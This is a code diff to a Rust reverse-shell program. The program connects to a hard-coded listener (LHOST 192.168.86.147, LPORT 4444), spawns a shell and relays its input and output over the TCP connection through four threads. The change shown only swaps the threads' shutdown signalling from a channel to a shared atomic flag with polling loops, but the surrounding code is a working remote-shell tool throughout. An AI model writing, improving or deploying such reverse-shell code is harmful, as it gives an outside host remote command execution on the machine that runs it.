@@ -14,9 +14,11 @@ use std::net::*;
 use std::process::*;
 use std::io::*;
 use std::thread;
+use std::sync::{Arc};
 use std::sync::mpsc;
 use std::sync::mpsc::*;
 use std::time::Duration;
+use std::sync::atomic::{AtomicBool, Ordering};
 
 const LHOST: &str = "192.168.86.147";
 const LPORT: &str = "4444";
@@ -44,33 +46,45 @@ fn handle_network_connection(stream: TcpStream) {
     let bash_in = shell_child.stdin.expect("Failed to open command stdin");
     let (net_tx, net_rx): (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();
     let (shell_tx, shell_rx): (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();
-    let (fin_sender, fin_receiver) : (Sender<()>, Receiver<()>) = mpsc::channel();
+    let finished = Arc::new(AtomicBool::new(false));
 
     debug!("Beginning IO read/write loops");
-    spawn_net_reader_thread(stream, net_tx, fin_sender.clone());
-    spawn_shell_reader_thread(cloned_stream, shell_rx, fin_sender.clone());
-    spawn_shell_writer_thread(bash_out, shell_tx, fin_sender.clone());
-    spawn_net_writer_thread(bash_in, net_rx, fin_sender.clone());
-    
+    spawn_net_reader_thread(stream, net_tx, Arc::clone(&finished));
+    spawn_shell_reader_thread(cloned_stream, shell_rx, Arc::clone(&finished));
+    spawn_shell_writer_thread(bash_out, shell_tx, Arc::clone(&finished));
+    spawn_net_writer_thread(bash_in, net_rx, Arc::clone(&finished));
+
     // Await completion of any thread.
     debug!("Waiting for threads to finish.");
-    fin_receiver.recv().unwrap();
+    loop {
+        if finished.load(Ordering::Relaxed) {
+            debug!("Other thread finished, time to stop.");
+            break;
+        }
+
+        thread::yield_now();
+    }
 }
 
-fn spawn_net_reader_thread(mut stream: TcpStream, net_tx: Sender<Vec<u8>>, fin_sender : Sender<()>) {
+fn spawn_net_reader_thread(mut stream: TcpStream, net_tx: Sender<Vec<u8>>, finished : Arc<AtomicBool>) {
     thread::spawn(move || {
         let mut buffer: [u8; 512] = [0; 512];
 
         loop {
+            if finished.load(Ordering::Relaxed) {
+                debug!("spawn_net_reader_thread stopping because other thread is done.");
+                break;
+            }
+
             match stream.take_error() {
                 Ok(e) => if let Some(e) = e {
                     error!("Stream error: {}", e);
-                    fin_sender.send(()).unwrap();
+                    finished.store(true, Ordering::Relaxed);
                     break;
                 },
                 Err(e) => {
                     error!("Failed to call take_error on TcpStream: {}", e);
-                    fin_sender.send(()).unwrap();
+                    finished.store(true, Ordering::Relaxed);
                     break;
                 }
             }
@@ -85,7 +99,7 @@ fn spawn_net_reader_thread(mut stream: TcpStream, net_tx: Sender<Vec<u8>>, fin_s
                         }
                         Err(e) => {
                             error!("Failed to send to net_tx: {}", e);
-                            fin_sender.send(()).unwrap();
+                            finished.store(true, Ordering::Relaxed);
                         }
                     }
                 },
@@ -96,28 +110,35 @@ fn spawn_net_reader_thread(mut stream: TcpStream, net_tx: Sender<Vec<u8>>, fin_s
                 },
                 Err(e) => {
                     error!("Error reading from stream: {}", e);
-                    fin_sender.send(()).unwrap();
+                    finished.store(true, Ordering::Relaxed);
                     break;
                 }
             }
+
+            thread::yield_now();
         }
 
         debug!("net_reader_thread finished");
     });
 }
 
-fn spawn_shell_reader_thread(mut stream: TcpStream, shell_rx: Receiver<Vec<u8>>, fin_sender : Sender<()>) {
+fn spawn_shell_reader_thread(mut stream: TcpStream, shell_rx: Receiver<Vec<u8>>, finished : Arc<AtomicBool>) {
     thread::spawn(move || {
         loop {
+            if finished.load(Ordering::Relaxed) {
+                debug!("spawn_shell_reader_thread stopping because other thread is done.");
+                break;
+            }
+
             match stream.take_error() {
                 Ok(e) => if let Some(e) = e {
                     error!("Stream error: {}", e);
-                    fin_sender.send(()).unwrap();
+                    finished.store(true, Ordering::Relaxed);
                     break;
                 },
                 Err(e) => {
                     error!("Failed to call take_error on TcpStream: {}", e);
-                    fin_sender.send(()).unwrap();
+                    finished.store(true, Ordering::Relaxed);
                     break;
                 }
             }
@@ -135,28 +156,35 @@ fn spawn_shell_reader_thread(mut stream: TcpStream, shell_rx: Receiver<Vec<u8>>,
                         },
                         Err(e) => {
                             error!("Failed to write to stream: {}", e);
-                            fin_sender.send(()).unwrap();
+                            finished.store(true, Ordering::Relaxed);
                             break;
                         }
                     }
                 }
                 Err(e) => {
                     error!("Failed to read from shell: {}", e);
-                    fin_sender.send(()).unwrap();
+                    finished.store(true, Ordering::Relaxed);
                     break;
                 }
             }
+
+            thread::yield_now();
         }
 
         debug!("shell_reader_thread finished");
     });
 }
 
-fn spawn_shell_writer_thread(mut bash_out: ChildStdout, shell_tx: Sender<Vec<u8>>, fin_sender : Sender<()>) {
+fn spawn_shell_writer_thread(mut bash_out: ChildStdout, shell_tx: Sender<Vec<u8>>, finished : Arc<AtomicBool>) {
     thread::spawn(move || {
         let mut buffer: [u8; 512] = [0; 512];
 
         loop {
+            if finished.load(Ordering::Relaxed) {
+                debug!("spawn_shell_writer_thread stopping because other thread is done.");
+                break;
+            }
+
             match bash_out.read(&mut buffer) {
                 Ok(count) => if count > 0 {
                     trace!("{:>4} read from shell_out", count);
@@ -167,26 +195,33 @@ fn spawn_shell_writer_thread(mut bash_out: ChildStdout, shell_tx: Sender<Vec<u8>
                         }
                         Err(e) => {
                             error!("Failed to write to shell_tx: {}", e);
-                            fin_sender.send(()).unwrap();
+                            finished.store(true, Ordering::Relaxed);
                             break;
                         }
                     }
                 },
                 Err(e) => {
                     error!("Failed to read from bash_out: {}", e);
-                    fin_sender.send(()).unwrap();
+                    finished.store(true, Ordering::Relaxed);
                     break;
                 }
             }
+
+            thread::yield_now();
         }
 
         debug!("shell_writer_thread finished");
     });
 }
 
-fn spawn_net_writer_thread(mut bash_in: ChildStdin, net_rx: Receiver<Vec<u8>>, fin_sender : Sender<()>) {
+fn spawn_net_writer_thread(mut bash_in: ChildStdin, net_rx: Receiver<Vec<u8>>, finished : Arc<AtomicBool>) {
     thread::spawn(move || {
         loop {
+            if finished.load(Ordering::Relaxed) {
+                debug!("spawn_net_writer_thread stopping because other thread is done.");
+                break;
+            }
+
             match net_rx.recv() {
                 Ok(data) => {
                     trace!("{:>4} received from net_rx", data.len());
@@ -197,17 +232,19 @@ fn spawn_net_writer_thread(mut bash_in: ChildStdin, net_rx: Receiver<Vec<u8>>, f
                         }
                         Err(e) => {
                             error!("Failed to write to bash_in: {}", e);
-                            fin_sender.send(()).unwrap();
+                            finished.store(true, Ordering::Relaxed);
                             break;
                         }
                     }
                 }
                 Err(e) => {
                     error!("Failed to receive from net_rx: {}", e);
-                    fin_sender.send(()).unwrap();
+                    finished.store(true, Ordering::Relaxed);
                     break;
                 }
             }
+
+            thread::yield_now();
         }
 
         debug!("net_writer_thread finished");
